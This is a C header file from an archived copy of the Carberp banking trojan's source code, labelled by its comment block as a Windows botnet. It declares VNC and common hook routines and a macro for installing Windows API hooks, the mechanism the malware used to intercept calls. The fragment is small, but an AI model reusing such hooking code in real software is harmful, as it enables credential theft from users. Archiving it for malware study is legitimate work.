/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef HOOKS_H_INCLUDED
#define HOOKS_H_INCLUDED

void DoVNCHooks();
void DoCommonHooks();

#define ADD_HOOK(STRUCT,API) STRUCT.API.lpHandler=(LPVOID)API##_handler;\
                             STRUCT.API.lpRealAddr=&p##API;

#endif // HOOKS_H_INCLUDED
